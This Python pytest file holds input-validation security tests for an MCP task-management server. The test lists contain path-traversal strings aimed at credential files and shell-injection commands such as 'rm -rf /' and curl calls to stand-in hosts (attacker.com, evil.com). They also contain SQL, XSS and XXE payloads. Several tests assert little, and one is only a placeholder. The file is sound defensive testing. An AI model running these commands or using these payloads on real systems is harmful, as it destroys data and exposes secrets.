"""
Input Validation Security Tests

Tests to ensure all user inputs are properly validated and sanitized
to prevent security vulnerabilities.
"""

import pytest
import asyncio
import tempfile
from pathlib import Path
from unittest.mock import patch

from wise_mise_mcp.server import (
    analyze_project_for_tasks,
    create_task,
    trace_task_chain
)
from wise_mise_mcp.analyzer import TaskAnalyzer
from wise_mise_mcp.manager import TaskManager


class TestInputValidation:
    """Security tests for input validation"""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented"""
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "../../../../../../etc/shadow", 
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",  # Double encoding attempt
            "/proc/self/environ",
            "/proc/version",
            "\\\\server\\share\\file",
        ]
        
        for malicious_path in malicious_paths:
            # Call the FastMCP tool function directly
            result = await analyze_project_for_tasks.fn(project_path=malicious_path)
            
            # Should return an error, not process the malicious path
            assert "error" in result
            # Any error is acceptable for security purposes - we just don't want successful processing
            assert result["error"] is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test prevention of command injection in task commands"""
        
        malicious_commands = [
            "echo 'hello'; rm -rf /",
            "echo 'hello' && cat /etc/passwd",
            "echo 'hello' | sh",
            "$(whoami)",
            "`rm -rf /`",
            "echo 'hello'; python -c \"import os; os.system('rm -rf /')\"",
            "echo 'hello' > /dev/null; curl malicious.com/steal",
            "echo $(curl attacker.com/payload)",
            "'; DROP TABLE users; --",
            "${IFS}cat${IFS}/etc/passwd",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for malicious_command in malicious_commands:
                # Fix: include required task_description field
                params = {
                    "project_path": temp_dir,
                    "task_description": f"Testing command injection with: {malicious_command[:50]}..."
                }
                
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                
                # Commands should be safely stored, not executed during creation
                # The actual execution would be handled by mise, not our server
                if "error" not in result:
                    # If task creation succeeds, verify the command is stored as-is
                    # without being interpreted or executed
                    assert result.get("task_created") is True or "success" in result
                    # The malicious command should be stored but not executed

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_large_input_handling(self):
        """Test handling of extremely large inputs"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Test very long project path
            long_path = temp_dir + "/" + "a" * 1000
            result = await analyze_project_for_tasks.fn(project_path=long_path)
            
            # Should handle gracefully without crashing
            assert isinstance(result, dict)
            
            # Test very long task description
            long_description = "x" * 10000
            params = {
                "project_path": temp_dir,
                "task_description": long_description
            }
            
            result = await create_task.fn(
                project_path=params["project_path"],
                task_description=params["task_description"],
                suggested_name=params.get("suggested_name")
            )
            assert isinstance(result, dict)
            
            # Test with very long suggested name
            long_name = "test_" + "y" * 5000
            params = {
                "project_path": temp_dir,
                "task_description": "Test long command",
                "suggested_name": long_name
            }
            
            result = await create_task.fn(
                project_path=params["project_path"],
                task_description=params["task_description"],
                suggested_name=params.get("suggested_name")
            )
            assert isinstance(result, dict)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_null_byte_injection(self):
        """Test handling of null byte injection attempts"""
        
        null_byte_inputs = [
            "normal_path\x00malicious",
            "task_name\x00; rm -rf /",
            "description\x00$(curl evil.com)",
            "command\x00 && cat /etc/passwd",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for malicious_input in null_byte_inputs:
                # Test in project path
                result = await analyze_project_for_tasks.fn(project_path=malicious_input)
                assert isinstance(result, dict)
                
                # Test in task description
                params = {
                    "project_path": temp_dir,
                    "task_description": malicious_input,
                    "suggested_name": f"null_test_{hash(malicious_input)}"
                }
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                assert isinstance(result, dict)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_attacks(self):
        """Test handling of various Unicode and encoding attacks"""
        
        unicode_attacks = [
            "test\u0000malicious",  # Null character
            "test\u001bmalicious",  # Escape character
            "test\u000amalicious",  # Newline
            "test\u000dmalicious",  # Carriage return
            "test\u0009malicious",  # Tab
            "test\ufeffmalicious",  # BOM
            "test\u200bmalicious",  # Zero-width space
            "тест",  # Cyrillic
            "テスト",  # Japanese
            "🔥💥🚨",  # Emojis
            "a" * 100 + "\ud83d\ude00",  # Long string with emoji
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for unicode_input in unicode_attacks:
                try:
                    params = {
                        "project_path": temp_dir,
                        "task_description": unicode_input,
                        "suggested_name": f"unicode_test_{abs(hash(unicode_input))}"
                    }
                    result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                    assert isinstance(result, dict)
                except UnicodeError:
                    # Unicode errors should be handled gracefully
                    pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks"""
        
        json_payloads = [
            '{"malicious": "payload"}',
            '"malicious_string"',
            '[1,2,3,"injection"]',
            '{"$where": "this.a == this.b"}',  # NoSQL injection attempt
            '{"\\u0000": "null_byte"}',
            '{"exec": "rm -rf /"}',
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for json_payload in json_payloads:
                params = {
                    "project_path": temp_dir,
                    "task_description": json_payload,
                    "suggested_name": f"json_test_{abs(hash(json_payload))}"
                }
                
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                assert isinstance(result, dict)
                
                # The JSON payload should be treated as plain text, not parsed

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xml_and_html_injection(self):
        """Test handling of XML/HTML injection attempts"""
        
        xml_html_payloads = [
            "<script>alert('xss')</script>",
            "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM '/etc/passwd'>]>",
            "<img src=x onerror=alert('xss')>",
            "<!--malicious comment-->",
            "<![CDATA[malicious data]]>",
            "&lt;script&gt;alert('encoded')&lt;/script&gt;",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for payload in xml_html_payloads:
                params = {
                    "project_path": temp_dir,
                    "task_description": payload,
                    "suggested_name": f"xml_test_{abs(hash(payload))}"
                }
                
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                assert isinstance(result, dict)

    @pytest.mark.security
    def test_input_sanitization_functions(self):
        """Test that input sanitization functions work correctly"""
        
        # These would test internal sanitization functions
        # For now, this documents the requirement
        
        dangerous_inputs = [
            "../../../etc/passwd",
            "$(rm -rf /)",
            "<script>alert('xss')</script>",
            "test\x00malicious",
            "'OR 1=1--",
        ]
        
        # In a real implementation, we would test:
        # 1. Path sanitization functions
        # 2. Command sanitization functions
        # 3. String sanitization functions
        # 4. Input validation functions
        
        for dangerous_input in dangerous_inputs:
            # Sanitized input should be safe
            # sanitized = sanitize_input(dangerous_input)
            # assert is_safe(sanitized)
            pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_type_confusion_attacks(self):
        """Test handling of type confusion attacks"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Try to pass wrong types to function parameters
            
            # Pass list where string expected
            try:
                params = {
                    "project_path": temp_dir,
                    "task_description": ["list", "instead", "of", "string"],  # Wrong type
                    "suggested_name": "type_test"
                }
                # This should be caught by FastMCP/Pydantic validation
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                # If no exception, the validation might have coerced the type
                assert isinstance(result, dict)
            except (TypeError, ValueError):
                # Expected - type validation should catch this
                pass
            
            # Pass dict where string expected
            try:
                params = {
                    "project_path": temp_dir,
                    "task_description": {"malicious": "dict"},  # Wrong type
                    "suggested_name": "type_test2"
                }
                result = await create_task.fn(
                    project_path=params["project_path"],
                    task_description=params["task_description"],
                    suggested_name=params.get("suggested_name")
                )
                assert isinstance(result, dict)
            except (TypeError, ValueError):
                # Expected - type validation should catch this
                pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Test handling of extremely large task descriptions
            large_description = "Test resource exhaustion with very large description: " + "x" * 50000
            
            params = {
                "project_path": temp_dir,
                "task_description": large_description,
                "suggested_name": "resource_test"
            }
            
            # Should handle gracefully, possibly with limits
            result = await create_task.fn(
                project_path=params["project_path"],
                task_description=params["task_description"],
                suggested_name=params.get("suggested_name")
            )
            assert isinstance(result, dict)
            
            # Test extremely large suggested name
            large_name = "test_" + "y" * 10000
            
            params = {
                "project_path": temp_dir,
                "task_description": "Test large name handling",
                "suggested_name": large_name
            }
            
            result = await create_task.fn(
                project_path=params["project_path"],
                task_description=params["task_description"],
                suggested_name=params.get("suggested_name")
            )
            assert isinstance(result, dict)